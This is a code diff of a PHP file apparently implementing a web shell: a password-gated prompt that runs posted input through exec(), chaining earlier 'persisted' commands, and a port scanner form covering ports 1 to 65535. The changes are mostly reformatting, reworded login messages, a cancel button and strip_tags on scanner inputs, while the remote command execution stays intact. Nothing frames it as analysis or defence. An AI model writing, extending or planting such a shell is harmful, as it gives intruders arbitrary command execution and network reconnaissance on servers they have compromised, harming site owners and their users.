@@ -1135,73 +1135,93 @@ class shellfunctions
         clear_command();
       }
 
-      if ( ! isset($_SESSION['persist_commands']) OR ! isset($_SESSION['commands'])) {
-        $_SESSION['persist_commands'] = array();
-        $_SESSION['commands'] = array();
-        $_SESSION['command_responses'] = array();
+      if (!isset($_SESSION['persist_commands']) OR !isset($_SESSION['commands']))
+      {
+        $_SESSION['persist_commands'] = array(); // ARRAY
+        $_SESSION['commands'] = array(); // ARRAY
+        $_SESSION['command_responses'] = array(); // ARRAY
       }
 
       $toggling_persist = FALSE;
       $toggling_current_persist_command = FALSE;
 
-      if (isset($_POST['persist_command_id']) AND is_numeric($_POST['persist_command_id'])) {
+      if (isset($_POST['persist_command_id']) AND is_numeric($_POST['persist_command_id']))
+      {
         $toggling_persist = TRUE;
         $persist_command_id = $_POST['persist_command_id'];
-        if (count($_SESSION['persist_commands']) == $persist_command_id) {
+        if (count($_SESSION['persist_commands']) == $persist_command_id)
+        {
           $toggling_current_persist_command = TRUE;
         } else {
           $_SESSION['persist_commands'][$persist_command_id] =
-            ! $_SESSION['persist_commands'][$persist_command_id];
+          ! $_SESSION['persist_commands'][$persist_command_id];
         }
       }
 
       $previous_commands = '';
 
-      foreach ($_SESSION['persist_commands'] as $index => $persist) {
-        if ($persist) {
+      foreach ($_SESSION['persist_commands'] as $index => $persist)
+      {
+        if ($persist)
+        {
           $current_command = $_SESSION['commands'][$index];
-          if ($current_command != '') {
+          if ($current_command != '')
+          {
             $previous_commands .= $current_command . '; ';
           }
         }
       }
 
-      if (isset($_POST['command'])) {
+      if(isset($_POST['command']))
+      {
         $command = htmlentities($_POST['command']);
-        if ( ! isset($_SESSION['logged_in'])) {
-          if ($command == $password) {
+        if(!isset($_SESSION['logged_in']))
+        {
+          if ($command == $password)
+          {
+            // sess will be true
             $_SESSION['logged_in'] = TRUE;
-            $response = array('Welcome, ' . str_replace("\n", '', `whoami`) . '!!');
+            // welcome message
+            $response = array('You\'re Logged in. user: ' . str_replace("\n", '', `whoami`));
           } else {
-            $response = array('Incorrect Key.');
+            // when key is not correct my guy.
+            $response = array('The key is incorrect. Try Again.');
           }
           array_push($_SESSION['persist_commands'], FALSE);
           array_push($_SESSION['commands'], 'Your key: ');
           array_push($_SESSION['command_responses'], $response);
         } else {
-          if ($command != '' AND ! $toggling_persist) {
-            if ($command == 'logout') {
+          if($command != '' AND ! $toggling_persist)
+          {
+            if($command == 'logout')
+            {
               unset($_SESSION['logged_in']);
               unset($_SESSION['commands']);
               $response = array('Successfully Logged Out');
-            } elseif ($command == 'clear') {
+            } elseif ($command == 'clear')
+            {
               clear_command();
             } else {
               exec($previous_commands . $command . ' 2>&1', $response, $error_code);
-              if ($error_code > 0 AND $response == array()) {
+              if ($error_code > 0 AND $response == array())
+              {
                 $response = array('Error');
               }
             }
           } else {
             $response = array();
           }
-          if ($command != 'logout' AND $command != 'clear') {
-            if ($toggling_persist) {
-              if ($toggling_current_persist_command) {
+          if($command != 'logout' AND $command != 'clear')
+          {
+            if ($toggling_persist)
+            {
+              if ($toggling_current_persist_command)
+              {
                 array_push($_SESSION['persist_commands'], TRUE);
                 array_push($_SESSION['commands'], $command);
                 array_push($_SESSION['command_responses'], $response);
-                if ($command != '') {
+                if($command != '')
+                {
                   $previous_commands = $previous_commands . $command . '; ';
                 }
               }
@@ -1213,8 +1233,7 @@ class shellfunctions
           }
         }
       }
-
-    ?>
+      ?>
       <style type="text/css">
 
         body {
@@ -1428,10 +1447,11 @@ class shellfunctions
       print("<code style='color: #FFE6E8;'>");
       print("<h2 style='color: #8B0000;'>Port Scanner</h2><hr><center>");
       print("<form method='POST' action=''>");
-      print("<br><br><br>Host: <br><input type='text' name='host' value='".$_SERVER['SERVER_NAME']."' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
+      print("<br><br><br>Host: <br><input type='text' name='host' value='".$_SERVER['HTTP_HOST']."' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
       print("<br><br><br>Start port: <br><input type='text' name='startport' value='1' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
       print("<br><br><br>End Port: <br><input type='text' name='endport' value='65535' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
-      print("<br><br><br><button type='submit' name='scanbitch' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>scan</button></form>");
+      print("<br><br><br><button type='submit' name='scanbitch' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>scan</button>");
+      print(" <button type='submit' name='cancel' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>cancel</button></form>");
 
       ?>
       <style>
@@ -1460,9 +1480,9 @@ class shellfunctions
         if(isset($_POST['scanbitch']))
         {
           // some variables
-          $host  = $_POST['host'];
-          $sport = $_POST['startport'];
-          $eport = $_POST['endport'];
+          $host  = strip_tags($_POST['host']);
+          $sport = strip_tags($_POST['startport']);
+          $eport = strip_tags($_POST['endport']);
 
           // check if socket_create does exists
           if(function_exists('socket_create'))
